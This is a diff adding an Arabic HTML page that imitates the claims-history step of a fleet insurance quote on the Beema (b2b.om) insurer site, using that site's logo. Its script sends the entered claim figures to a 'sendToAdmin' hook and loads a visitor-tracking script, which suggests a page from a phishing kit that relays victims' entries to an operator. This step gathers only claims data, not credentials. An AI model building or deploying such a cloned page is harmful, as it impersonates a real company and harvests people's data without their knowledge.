@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بيمة</title>
+  <link rel="icon" type="image/x-icon" href="https://b2b.om/assets/images/isc2.png">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { font-family: 'Rubik', sans-serif; }
+    body { background: #faf8f5; margin: 0; padding: 0; }
+    
+    /* Header */
+    .b2b-header {
+      background: #fff;
+      padding: 12px 0;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+      z-index: 9;
+      position: relative;
+    }
+    .b2b-header .container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .b2b-header .logo img { height: 50px; }
+    .b2b-header nav ul {
+      list-style: none;
+      display: flex;
+      gap: 30px;
+      margin: 0;
+      padding: 0;
+      align-items: center;
+    }
+    .b2b-header nav ul li a {
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    .b2b-header nav ul li a:hover { color: #6b8e23; }
+    .b2b-header .header-left {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .b2b-header .header-left a {
+      text-decoration: none;
+      color: #333;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .b2b-header .header-left .globe { font-size: 18px; cursor: pointer; }
+
+    /* Page Header / Stepper */
+    .page-header {
+      background: radial-gradient(circle, #fff3cd 0%, #fff 100%);
+      padding: 20px 0 15px;
+      position: relative;
+    }
+    .page-header::after {
+      content: "";
+      position: absolute;
+      left: 0;
+      bottom: 0;
+      width: 100%;
+      height: 1.3px;
+      background: linear-gradient(to right, #5eac1200, #d1d1d1, #5eac1200);
+      z-index: 1;
+    }
+    .page-heading {
+      color: #74a936;
+      font-size: 32px;
+      font-weight: 400;
+      margin: 0;
+    }
+    .sm-stepper {
+      display: flex;
+      flex-wrap: nowrap;
+      justify-content: center;
+      align-items: flex-start;
+      width: 100%;
+      max-width: 100%;
+      position: relative;
+      box-sizing: border-box;
+      gap: 15px;
+      overflow-x: auto;
+      overflow-y: hidden;
+      isolation: isolate;
+    }
+    .sm-stepper__item {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      flex: 0 0 auto;
+      min-inline-size: clamp(80px, 25vw, 100px);
+      z-index: 1;
+    }
+    .sm-stepper__item:before,
+    .sm-stepper__item:after {
+      content: "";
+      position: absolute;
+      top: calc(12px);
+      height: 1px;
+      background-color: #c5dfab;
+      pointer-events: none;
+      z-index: -1;
+    }
+    .sm-stepper__item:before {
+      inset-inline-end: calc(50% + 12px);
+      width: calc(50% - 12px + 7.5px);
+    }
+    .sm-stepper__item:after {
+      inset-inline-start: calc(50% + 12px);
+      width: calc(50% - 12px + 7.5px);
+    }
+    .sm-stepper__item:first-child:before {
+      display: none;
+    }
+    .sm-stepper__item:last-child:after {
+      display: none;
+    }
+    .sm-stepper__link,
+    .sm-stepper__link:visited {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-decoration: none;
+      color: inherit;
+    }
+    .sm-stepper__circle {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #fff;
+      border: 1px solid #c5dfab;
+      display: grid;
+      place-items: center;
+      color: #1f2937;
+      font-weight: 400;
+      font-size: 16px;
+      position: relative;
+      z-index: 1;
+    }
+    .sm-stepper__label {
+      margin-top: 4px;
+      font-size: 16px;
+      color: #4b5563;
+    }
+    .sm-stepper__item.sm-is-done .sm-stepper__circle {
+      background: #c5dfab;
+      border-color: #c5dfab;
+      color: #5eac12;
+    }
+    .sm-stepper__item[aria-current="step"] .sm-stepper__circle {
+      background: #5eac12;
+      border-color: #5eac12;
+      color: #fff;
+    }
+    .sm-stepper__item[aria-current="step"] .sm-stepper__label {
+      color: #5eac12;
+    }
+
+    /* Main Content */
+    .main-content {
+      padding: 40px 0;
+      min-height: 60vh;
+    }
+    .content-card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 40px;
+      max-width: 700px;
+      margin: 0 auto;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+    }
+    .content-card h4 {
+      font-size: 22px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    .content-card p {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 25px;
+    }
+
+    /* Table */
+    .table-responsive {
+      margin-bottom: 30px;
+    }
+    .table {
+      border: 1px solid #dee2e6;
+    }
+    .table th {
+      background: #f8f9fa;
+      font-weight: 600;
+      font-size: 14px;
+      text-align: center;
+      padding: 12px;
+    }
+    .table td {
+      text-align: center;
+      padding: 0;
+      vertical-align: middle;
+    }
+    .table td.year-cell {
+      padding: 12px;
+      font-weight: 500;
+      width: 70px;
+    }
+    .table td.input-cell {
+      padding: 0;
+      position: relative;
+    }
+    .input-wrapper {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      height: 100%;
+    }
+    .table input[type="number"] {
+      border: none;
+      text-align: center;
+      flex: 1;
+      padding: 12px;
+      font-size: 14px;
+      outline: none;
+      -moz-appearance: textfield;
+      appearance: textfield;
+    }
+    .table input[type="number"]::-webkit-inner-spin-button,
+    .table input[type="number"]::-webkit-outer-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    .table input[type="number"]:focus {
+      background: #f0f8e8;
+    }
+    .spin-btns {
+      display: flex;
+      flex-direction: column;
+      border-left: 1px solid #dee2e6;
+      height: 100%;
+      min-width: 20px;
+      align-items: center;
+      justify-content: center;
+    }
+    .spin-btns button {
+      border: none;
+      background: transparent;
+      cursor: pointer;
+      padding: 2px 6px;
+      font-size: 10px;
+      color: #999;
+      line-height: 1;
+    }
+    .spin-btns button:hover {
+      background: #f0f0f0;
+      color: #333;
+    }
+
+    /* Buttons */
+    .btn-actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 30px;
+    }
+    .btn-theme-outline {
+      border: 2px solid #80c739;
+      color: #80c739;
+      background: #fff;
+      padding: 0.9rem 1.2rem;
+      border-radius: 0.35rem;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      height: calc(3.5rem + 4px);
+      min-height: calc(3.5rem + 4px);
+      line-height: 1.25;
+      transition: all 0.25s ease;
+    }
+    .btn-theme-outline:hover {
+      background: #c5dfab;
+      color: #fff;
+    }
+    .btn-theme-outline-gray {
+      border: 2px solid #667085;
+      color: #667085;
+      background: #fff;
+      padding: 0.9rem 1.2rem;
+      border-radius: 0.35rem;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      height: calc(3.5rem + 4px);
+      min-height: calc(3.5rem + 4px);
+      line-height: 1.25;
+      transition: all 0.25s ease;
+    }
+    .btn-theme-outline-gray:hover {
+      background: #667085;
+      color: #fff;
+    }
+
+    /* Footer */
+    .b2b-footer {
+      background: #333;
+      color: #fff;
+      padding: 20px 0;
+      margin-top: 40px;
+    }
+    .b2b-footer .container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .b2b-footer a {
+      color: #ccc;
+      text-decoration: none;
+      font-size: 13px;
+      margin: 0 10px;
+    }
+    .b2b-footer a:hover { color: #fff; }
+    .b2b-footer .copyright {
+      font-size: 13px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="b2b-header">
+    <div class="container">
+      <div class="logo">
+        <a href="/"><img src="https://b2b.om/assets/images/isc2.png" alt="بيمة للأعمال"></a>
+      </div>
+      <nav>
+        <ul>
+          <li><a href="/">الصفحة الرئيسية</a></li>
+          <li><a href="javascript:void(0)">تأمين</a></li>
+          <li><a href="javascript:void(0)">من نحن</a></li>
+          <li><a href="javascript:void(0)">تواصل معنا</a></li>
+        </ul>
+      </nav>
+      <div class="header-left">
+        <span class="globe"><i class="fa-solid fa-globe"></i></span>
+        <a href="tel:96822644442"><i class="fa-solid fa-headset"></i> <span dir="ltr">968 22644442</span></a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Page Header with Stepper -->
+  <div class="page-header">
+    <div class="container">
+      <div class="row align-items-center">
+        <div class="col-12 col-md-6 text-center text-md-end">
+          <h1 class="page-heading">تأمين اسطول المركبات</h1>
+        </div>
+        <div class="col-12 col-md-6">
+          <div class="sm-stepper">
+            <div class="sm-stepper__item sm-is-done">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">1</span>
+                <span class="sm-stepper__label">تفاصيل</span>
+              </a>
+            </div>
+            <div class="sm-stepper__item" aria-current="step">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">2</span>
+                <span class="sm-stepper__label">سجل المطالبات</span>
+              </a>
+            </div>
+            <div class="sm-stepper__item">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">3</span>
+                <span class="sm-stepper__label">إضافة مركبة</span>
+              </a>
+            </div>
+            <div class="sm-stepper__item">
+              <a class="sm-stepper__link">
+                <span class="sm-stepper__circle">4</span>
+                <span class="sm-stepper__label">العروض</span>
+              </a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main-content">
+    <div class="container">
+      <div class="content-card">
+        <h4>سجل المطالبات</h4>
+        <p>تعبئة سجل المطالبات الخاص بك لآخر <span>3</span> سنوات إذا تم تقديم أي مطالبة خلال هذه الفترة.</p>
+
+        <div class="table-responsive">
+          <table class="table table-sm table-bordered align-middle text-center">
+            <thead class="table-light">
+              <tr>
+                <th class="text-center">السنة</th>
+                <th class="text-center">عدد المطالبات</th>
+                <th class="text-center">مبلغ المطالبات (ر.ع)</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td class="year-cell">2025</td>
+                <td class="input-cell"><div class="input-wrapper"><input type="number" min="0" value="0"><div class="spin-btns"><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepUp()">&#9650;</button><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepDown()">&#9660;</button></div></div></td>
+                <td class="input-cell"><div class="input-wrapper"><input type="number" min="0" value="0"><div class="spin-btns"><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepUp()">&#9650;</button><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepDown()">&#9660;</button></div></div></td>
+              </tr>
+              <tr>
+                <td class="year-cell">2024</td>
+                <td class="input-cell"><div class="input-wrapper"><input type="number" min="0" value="0"><div class="spin-btns"><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepUp()">&#9650;</button><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepDown()">&#9660;</button></div></div></td>
+                <td class="input-cell"><div class="input-wrapper"><input type="number" min="0" value="0"><div class="spin-btns"><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepUp()">&#9650;</button><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepDown()">&#9660;</button></div></div></td>
+              </tr>
+              <tr>
+                <td class="year-cell">2023</td>
+                <td class="input-cell"><div class="input-wrapper"><input type="number" min="0" value="0"><div class="spin-btns"><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepUp()">&#9650;</button><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepDown()">&#9660;</button></div></div></td>
+                <td class="input-cell"><div class="input-wrapper"><input type="number" min="0" value="0"><div class="spin-btns"><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepUp()">&#9650;</button><button type="button" onclick="this.closest('.input-wrapper').querySelector('input').stepDown()">&#9660;</button></div></div></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="btn-actions">
+          <button type="button" class="btn-theme-outline-gray" onclick="window.history.back()">
+            <i class="fas fa-arrow-right"></i> السابق
+          </button>
+          <button type="button" class="btn-theme-outline" onclick="goToAddVehicle()">
+            التالي <i class="fas fa-arrow-left"></i>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="b2b-footer">
+    <div class="container">
+      <div class="copyright">حقوق الطبع والنشر &copy; 2026, جميع الحقوق محفوظة</div>
+      <div>
+        <a href="/">الصفحة الرئيسية</a>
+        <a href="javascript:void(0)">شروط</a>
+        <a href="javascript:void(0)">سياسة الخصوصية</a>
+        <a href="javascript:void(0)">اتصال</a>
+      </div>
+    </div>
+  </footer>
+
+<script>
+  function goToAddVehicle() {
+    if (window.sendToAdmin) {
+      var rows = document.querySelectorAll('table tbody tr');
+      var data = {};
+      rows.forEach(function(row, i) {
+        var cells = row.querySelectorAll('td');
+        var year = cells[0] ? cells[0].textContent.trim() : '';
+        var inputs = row.querySelectorAll('input');
+        if (inputs.length >= 2) {
+          data['السنة ' + year] = 'عدد المطالبات: ' + inputs[0].value + ', المبلغ: ' + inputs[1].value;
+        }
+      });
+      window.sendToAdmin(data, 'B2B أسطول - سجل المطالبات');
+    }
+    window.location.href = '/insurance/b2b-fleet-add-vehicle';
+  }
+</script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
